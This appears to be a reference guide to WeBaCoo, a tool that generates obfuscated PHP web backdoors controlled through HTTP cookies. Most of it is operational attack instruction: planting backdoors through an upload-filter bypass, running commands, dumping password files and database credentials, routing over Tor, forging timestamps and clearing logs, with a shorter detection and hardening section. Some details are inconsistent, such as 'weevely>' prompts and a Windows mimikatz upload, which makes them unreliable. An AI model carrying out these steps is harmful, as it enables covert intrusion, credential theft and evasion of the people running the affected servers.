---
title: "WeBaCoo"
category: "Persistence"
tool_name: "WeBaCoo"
version: "0.2.3"
kali_package: "webacoo"
install_size: "65 KB"
language: "Perl"
author: "Anestis Bechtsoudis"
license: "GPL-3.0"
github: "https://github.com/anestisb/WeBaCoo"
kali_url: "https://www.kali.org/tools/webacoo/"
mitre_tactic: "persistence"
mitre_tactic_id: "TA0003"
tags: ["persistence", "web-backdoor", "cookie-based", "perl", "php", "obfuscation"]
date: "2026-07-18"
---

# WeBaCoo — Web Backdoor Cookie Script-Kit

## 1. Overview

**WeBaCoo** (Web Backdoor Cookie Script-Kit) is a Perl-based tool that generates obfuscated PHP backdoor scripts and provides a client to communicate with them over HTTP. The backdoor encodes commands and output in HTTP cookie fields, making the traffic blend with normal web activity. WeBaCoo is designed for authorized penetration testing and red team engagements where persistent, stealthy access to a compromised web server is required.

The tool produces small PHP one-liners that accept commands via cookie values, execute them using configurable PHP system functions (`system`, `shell_exec`, `exec`, `passthru`, `popen`), and return results encoded in response cookies. This cookie-based channel avoids obvious GET/POST parameters that WAFs and IDS systems commonly inspect.

### Core Capabilities

- **Obfuscated PHP backdoor generation** with five PHP function options
- **Cookie-based command channel** hiding commands in HTTP headers
- **Remote terminal mode** for interactive shell sessions
- **Single command execution** mode for quick one-off commands
- **Extension modules** for MySQL/Postgres CLI, file transfer, and stealth
- **Proxy support** including Tor for anonymized connections
- **Metasploit Framework integration** via companion module
- **Customizable HTTP method** (GET/POST) for command transmission
- **User-Agent spoofing** to match target environment fingerprints

### When to Use WeBaCoo

- Web application post-exploitation where command parameters must avoid WAF inspection
- Persistent access to PHP-based web servers
- Engagements requiring cookie-based C2 to evade signature detection
- Environments where standard webshells are detected by file integrity monitoring
- Scenarios requiring database CLI access through a web backdoor
- Testing WAF and IDS evasion techniques using cookie-based channels
- Red team operations needing stealthy, persistent PHP access

### Comparison with Other Tools

| Feature | WeBaCoo | weevely | simple-backdoor.php |
|---------|---------|---------|-------------------|
| Communication | Cookie-based | HTTP POST/GET | GET parameter |
| Obfuscation | Yes (built-in) | Yes (polymorphic) | None |
| Modules | 5 | 30+ | 0 |
| Session recovery | No | Yes | No |
| Metasploit integration | Yes | No | No |
| Proxy support | Yes (Tor/SOCKS) | Yes | No |
| Encryption | Base64 only | Base64 + protocol obfuscation | None |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install webacoo
```

**Explanation:** WeBaCoo is included in Kali's default repositories. The package pulls in `perl`, `liburi-perl`, and `libio-socket-socks-perl` as dependencies.

### From Source (Alternative)

```bash
git clone https://github.com/anestisb/WeBaCoo.git /opt/webacoo
cd /opt/webacoo && chmod +x webacoo.pl
```

**Explanation:** Clones the upstream repository. The tool runs as a single Perl script with no compilation required.

### Dependencies

| Package | Purpose | Required |
|---------|---------|----------|
| `perl` | Runtime interpreter | Yes |
| `liburi-perl` | URI parsing for HTTP requests | Yes |
| `libio-socket-socks-perl` | SOCKS proxy/Tor support | Optional (for `-p tor`) |

**Caveat:** If Tor proxy support is not needed, `libio-socket-socks-perl` can be skipped. Comment line 25 in `webacoo.pl` to remove the hard dependency.

### Verifying Installation

```bash
webacoo -h
```

**Explanation:** Displays the help screen with all available options. If this produces output, the installation is correct.

---

## 3. Command Reference

### 3.1 Backdoor Generation

```bash
webacoo -g -o /var/www/html/shell.php
```

**Explanation:** Generates an obfuscated PHP backdoor using the default `system()` function. The output file `shell.php` is written to the specified path and must be accessible via the web server.

#### PHP Function Selection

| Flag | Value | PHP Function | Behavior | Stealth Level |
|------|-------|-------------|----------|--------------|
| `-f 1` | default | `system()` | Execute shell commands, output returned directly | Low |
| `-f 2` | | `shell_exec()` | Execute via shell, returns output as string | Medium |
| `-f 3` | | `exec()` | Execute command, returns last line only | Medium |
| `-f 4` | | `passthru()` | Execute and pass raw binary output | Medium |
| `-f 5` | | `popen()` | Open process pipe for read/write | High |

```bash
webacoo -g -f 2 -o stealth.php
```

**Explanation:** Generates a backdoor using `shell_exec()` instead of the default `system()`. `shell_exec()` can bypass some `disable_functions` restrictions where `system()` is blocked but `shell_exec()` is not.

#### Function Selection Strategy

When choosing a PHP function for the backdoor:

- **`system()` (default):** Most direct, but first function blocked by most `disable_functions` lists
- **`shell_exec()`:** Good alternative when `system()` is restricted; returns full output
- **`exec()`:** Returns only the last line of output; useful for single-value queries
- **`passthru()`:** Best for binary data; useful when downloading files
- **`popen()`:** Opens a process pipe; harder to detect because it uses different PHP internals

#### Un-obfuscated Mode

```bash
webacoo -g -o raw.php -r
```

**Explanation:** Generates readable, un-obfuscated backdoor code. Useful for debugging or understanding the generated payload before deploying it. Not recommended for production engagements.

#### Multiple Backdoors

```bash
webacoo -g -f 1 -o /var/www/html/api.php
webacoo -g -f 2 -o /var/www/html/images/config.php
webacoo -g -f 5 -o /var/www/html/includes/init.php
```

**Explanation:** Deploying multiple backdoors with different PHP functions provides redundancy. If one function is blocked by `disable_functions`, another may still work.

### 3.2 Remote Terminal Connection

```bash
webacoo -t -u http://192.168.1.50/shell.php
```

**Explanation:** Establishes an interactive terminal session with the deployed backdoor. The client encodes commands in cookies and decodes responses from the server.

#### Custom Cookie Name

```bash
webacoo -t -u http://target.example.com/shell.php -c "PHPSESSID"
```

**Explanation:** Uses `PHPSESSID` as the cookie name instead of the default `M-cookie`. Mimicking legitimate session cookies makes the traffic less conspicuous in proxy logs.

#### Cookie Name Selection Strategy

| Cookie Name | Environment | Why |
|------------|-------------|-----|
| `PHPSESSID` | PHP applications | Standard PHP session cookie name |
| `JSESSIONID` | Java applications | Standard Java session cookie name |
| `ASP.NET_SessionId` | .NET applications | Standard ASP.NET session cookie name |
| `M-cookie` | Default | WeBaCoo default; easily detected |

#### Custom Delimiter

```bash
webacoo -t -u http://target.example.com/shell.php -d "||"
```

**Explanation:** Sets a custom delimiter (`||`) for separating command components within the cookie value. Random delimiters are generated by default for each request, which increases entropy but can confuse some logging systems.

#### Delimiter Selection

- **Random (default):** Each request uses a different delimiter, maximizing entropy
- **Fixed delimiter:** Use `-d` for consistent delimiters when debugging or logging
- **Common delimiters:** `||`, `::`, `//`, `##` — choose based on what the target environment uses in legitimate cookies

### 3.3 Single Command Execution

```bash
webacoo -t -e "whoami" -u http://192.168.1.50/shell.php
```

**Explanation:** Executes a single command and exits. The `-e` flag requires both `-t` (terminal mode) and `-u` (backdoor URL) to be specified.

#### Automated Command Execution

```bash
# Script multiple commands
for cmd in "id" "uname -a" "cat /etc/passwd" "ls -la /var/www"; do
    webacoo -t -e "$cmd" -u http://192.168.1.50/shell.php -l /tmp/webacoo.log
done
```

**Explanation:** Iterates over a list of commands, executing each through the backdoor. Useful for automated reconnaissance scripts during engagements.

### 3.4 Proxy and Anonymity

```bash
webacoo -t -u http://target.example.com/shell.php -p 127.0.0.1:8080
```

**Explanation:** Routes all traffic through a local HTTP proxy (e.g., Burp Suite on port 8080). Useful for inspecting the cookie-based traffic during testing.

```bash
webacoo -t -u http://target.example.com/shell.php -p tor
```

**Explanation:** Routes traffic through the Tor network. Requires a Tor SOCKS proxy running on the default port (9050).

```bash
webacoo -t -u http://target.example.com/shell.php -p user:pass:10.0.1.8:3128
```

**Explanation:** Routes traffic through an authenticated HTTP proxy with username and password credentials.

#### Proxy Use Cases

| Proxy Type | Command | Use Case |
|-----------|---------|----------|
| HTTP proxy (Burp) | `-p 127.0.0.1:8080` | Inspect traffic, debug communication |
| Tor | `-p tor` | Anonymize source IP, evade IP-based blocking |
| Authenticated proxy | `-p user:pass:ip:port` | Corporate proxy with authentication |
| SOCKS5 proxy | `-p socks5://127.0.0.1:1080` | General SOCKS tunneling |

**Caveat:** Tor routing adds significant latency. Interactive sessions may be sluggish over Tor.

### 3.5 HTTP Method Selection

```bash
webacoo -t -u http://target.example.com/shell.php -m POST
```

**Explanation:** Uses HTTP POST instead of GET for command transmission. POST-based traffic is less likely to appear in web server access logs compared to GET parameters.

#### GET vs POST

| Method | Pros | Cons |
|--------|------|------|
| GET (default) | Simpler, works in browser | Parameters appear in access logs, referrer headers |
| POST | Commands hidden from access logs | Requires POST support in the backdoor |

### 3.6 User-Agent Spoofing

```bash
webacoo -t -u http://target.example.com/shell.php \
  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

**Explanation:** Sets a custom User-Agent header. Default is an empty string. Matching the target environment's legitimate User-Agent patterns improves stealth.

### 3.7 Verbose Output

```bash
webacoo -t -u http://target.example.com/shell.php -v 2
```

**Explanation:** Verbosity level 2 prints both HTTP headers and data for every request. Level 1 prints headers only. Level 0 (default) suppresses additional output.

### 3.8 Activity Logging

```bash
webacoo -t -u http://target.example.com/shell.php -l /tmp/webacoo.log
```

**Explanation:** Logs all session activity to the specified file. Essential for documentation during authorized engagements.

---

## 4. Extension Modules

WeBaCoo supports runtime-loadable extension modules. Once connected in terminal mode, use `load` to list available modules and initialize them.

### Loading Modules

```text
weevely> load
```

Available modules:

| Module | Description | Use Case |
|--------|-------------|----------|
| `mysql-cli` | MySQL command-line interface through the backdoor | Direct database queries without port exposure |
| `psql-cli` | PostgreSQL command-line interface through the backdoor | PostgreSQL administration through web server |
| `upload` | File upload via HTTP POST | Deploy additional tools to the target |
| `download` | File download via `od` and `xxd` output encoding | Exfiltrate files through the backdoor channel |
| `stealth` | `.htaccess` handling for increased evasion | Block directory listing, add access restrictions |

### MySQL Module Example

```text
weevely> load mysql-cli
mysql> SELECT user, host, password FROM mysql.user;
mysql> SHOW DATABASES;
mysql> SELECT * FROM usersdb.users;
```

**Explanation:** The MySQL module connects to the database using the target's existing credentials (typically found in configuration files) and provides an interactive SQL console.

### PostgreSQL Module Example

```text
weevely> load psql-cli
psql> \dt
psql> SELECT * FROM accounts;
```

### File Upload Module

```text
weevely> load upload
upload> push /tmp/exploit.tar.gz /var/www/html/uploads/
```

### File Download Module

```text
weevely> load download
download> pull /etc/passwd
```

### Stealth Module

```text
weevely> load stealth
stealth> deny_listing
stealth> add_restriction 192.168.1.0/24
```

**Explanation:** The stealth module modifies `.htaccess` files to block directory listing and add IP-based access restrictions. Only allows connections from specified networks.

### Unloading Modules

```text
weevely> unload
```

**Explanation:** Restores the session to the initial terminal mode after using an extension module.

---

## 5. Metasploit Integration

WeBaCoo ships with a Metasploit Framework module (`msf_webacoo_module.rb`) for integration into post-exploitation workflows.

```bash
msfconsole
use exploit/multi/http/webacoo_exec
set RHOSTS 192.168.1.50
set TARGETURI /shell.php
exploit
```

**Explanation:** The MSF module connects to a deployed WeBaCoo backdoor and provides Meterpreter or shell sessions. This integrates cookie-based persistence into larger attack chains managed by Metasploit.

### MSF Module Options

```bash
msf6> show options

Module options:
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port]
   RHOSTS    192.168.1.50     yes       The target address
   RPORT     80               yes       The target port
   TARGETURI /shell.php       yes       Path to the WeBaCoo backdoor
   VHOST                      no        HTTP server virtual host
```

---

## 6. Attack Chain Integration

### Step 1: Reconnaissance

```bash
# Identify web technology
whatweb http://192.168.1.50/

# Enumerate directories
gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt

# Find upload points
gobuster dir -u http://192.168.1.50/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
```

### Step 2: Generate the Backdoor

```bash
webacoo -g -f 2 -o /tmp/shell.php
```

**Explanation:** Generates a backdoor using `shell_exec()` for the target PHP server.

### Step 3: Upload to Target

```bash
# Method A: SSH (if credentials available)
scp /tmp/shell.php user@192.168.1.50:/var/www/html/images/shell.php

# Method B: File upload vulnerability
curl -F "file=@/tmp/shell.php;type=image/jpeg" \
  -F "name=avatar.jpg.php" \
  http://192.168.1.50/upload.php

# Method C: SQL injection with INTO OUTFILE
# (requires MySQL FILE privilege and writable directory)
```

**Explanation:** The backdoor must reach a web-accessible directory. Naming it as an image file (e.g., `shell.jpg.php`) or placing it in an uploads directory may bypass basic filename-based filtering.

### Step 4: Verify Accessibility

```bash
curl -I http://192.168.1.50/images/shell.php
```

**Explanation:** Confirm the web server returns HTTP 200 and the response Content-Type indicates PHP execution (not a download).

### Step 5: Connect

```bash
webacoo -t -u http://192.168.1.50/images/shell.php -c "PHPSESSID" -m POST
```

### Step 6: Post-Exploitation

```text
# Load MySQL module
weevely> load mysql-cli

# Enumerate databases
mysql> SHOW DATABASES;

# Search for credentials
mysql> SELECT user, password FROM wordpress.wp_users;

# Upload additional tools
weevely> unload
weevely> load upload
upload> push /tmp/mimikatz.exe C:\\Users\\Administrator\\Desktop\\
```

### Step 7: Cleanup

```bash
# Remove backdoor
webacoo -t -e "rm /var/www/html/images/shell.php" -u http://192.168.1.50/images/shell.php

# Verify removal
curl -s -o /dev/null -w "%{http_code}" http://192.168.1.50/images/shell.php
# Should return 404
```

---

## 7. Detection and Defense

### Indicators of Compromise

- **Cookie values with high entropy** (Base64-encoded command strings in `M-cookie` or custom cookie names)
- **PHP files with `eval()`, `base64_decode()`, and cookie variable access** in the same function
- **Unusual PHP execution functions** (`system`, `shell_exec`, `exec`, `passthru`, `popen`) in web-root files
- **`.htaccess` modifications** created by the stealth module
- **HTTP requests with encoded data in Cookie headers** returning encoded data in Set-Cookie
- **Single-line PHP files** with encoded payloads
- **PHP files with `$_COOKIE` superglobal access** combined with execution functions

### Detection Signatures

```bash
# Search for WeBaCoo-generated backdoors
grep -rn "M-cookie\|base64_decode\|gzinflate" /var/www/html/ --include="*.php"

# Check for obfuscated one-liner PHP files
find /var/www/html -name "*.php" -exec wc -l {} \; | awk '$1 < 5'

# Inspect access logs for cookie-based anomalies
awk '/M-cookie/ || /eval.*base64/' /var/log/apache2/access.log

# Search for PHP files with cookie + execution function patterns
grep -rn "\$_COOKIE.*system\|\$_COOKIE.*exec\|\$_COOKIE.*passthru" /var/www/html/ --include="*.php"

# Find PHP files smaller than 2KB with encoded content
find /var/www/html -name "*.php" -size -2k -exec grep -l "base64_decode\|gzinflate\|eval" {} \;
```

### Log Analysis

```bash
# Apache: Find requests with suspicious cookie values
awk '{for(i=1;i<=NF;i++) if($i ~ /Cookie:/) print}' /var/log/apache2/access.log | head -20

# Nginx: Same analysis
awk '/Cookie:.*[A-Za-z0-9+/=]{20,}/' /var/log/nginx/access.log

# Look for repeated requests to the same PHP file (session pattern)
awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20
```

### Defensive Measures

- **File integrity monitoring** (AIDE, Tripwire) on web-root directories
- **WAF rules** inspecting cookie values for Base64 patterns and PHP function names
- **`disable_functions`** in `php.ini` to block `system`, `shell_exec`, `exec`, `passthru`, `popen`
- **ModSecurity** rules flagging HTTP requests with encoded Cookie headers
- **Regular audit** of `.htaccess` files for unauthorized directives
- **Network monitoring** for unusual outbound connections from web servers
- **PHP configuration hardening** (`open_basedir`, `allow_url_include = Off`)
- **Web server user isolation** (run as non-root, minimal permissions)

---

## 8. Operational Considerations

### Stealth Techniques

- **Cookie name rotation:** Use `-c` to match legitimate session cookie names on the target
- **Delimiter randomization:** The default random delimiter per request increases traffic entropy
- **POST method:** Use `-m POST` to keep commands out of access logs
- **User-Agent matching:** Set `-a` to match the target environment's browser fingerprint
- **Tor routing:** Use `-p tor` for anonymized command execution
- **Blended deployment:** Place backdoor in a directory with many legitimate PHP files
- **Timestamp manipulation:** Use `touch` to match the backdoor's mtime with surrounding files
- **Multiple backdoors:** Deploy several with different functions for redundancy

### Limitations

- **PHP only:** The backdoor is PHP-specific; no support for ASP, JSP, or other server-side languages
- **No HTTPS built-in:** The tool communicates over plain HTTP; HTTPS requires a reverse proxy or tunnel
- **Single-threaded:** Only one interactive session at a time per backdoor instance
- **Cookie size limits:** Some browsers and proxies truncate cookies beyond ~4KB, limiting command complexity
- **No encryption:** Commands and output are encoded (Base64), not encrypted. Network-level inspection can decode them
- **No session persistence:** If the connection drops, you must reconnect manually (no auto-reconnect)
- **Limited module set:** Only 5 extension modules compared to weevely's 30+

### Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Empty output | `disable_functions` blocks selected PHP function | Try `-f 2` (shell_exec) or `-f 5` (popen) |
| Connection timeout | Firewall blocking HTTP | Use `-p tor` or a different proxy |
| Cookie not sent | Browser/client stripping cookies | Verify with `-v 2` to see full HTTP traffic |
| 403 Forbidden | `.htaccess` or directory restrictions | Upload to a different directory |
| 500 Internal Server Error | PHP syntax error in backdoor | Use `-r` to check un-obfuscated code |

### Best Practices

- Deploy backdoors in directories with existing PHP files to blend with normal traffic
- Use the stealth module to add `.htaccess` rules that block directory listing
- Clean up access logs after testing
- Remove backdoors immediately after the engagement concludes
- Document all backdoor locations, passwords, and module usage for the final report
- Test the backdoor locally before deploying to the target
- Use `-r` to inspect un-obfuscated code before deployment
- Choose the PHP function based on the target's `disable_functions` configuration

---

## Resources

- **WeBaCoo GitHub:** https://github.com/anestisb/WeBaCoo
- **Kali Linux Tool Page:** https://www.kali.org/tools/webacoo/
- **Metasploit Module:** `msf_webacoo_module.rb` included in the repository
- **Perl Documentation:** `perldoc webacoo.pl` for extended usage notes
- **MITRE ATT&CK Persistence (TA0003):** https://attack.mitre.org/tactics/TA0003/
- **PHP Security Configuration:** https://www.php.net/manual/en/security.php
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
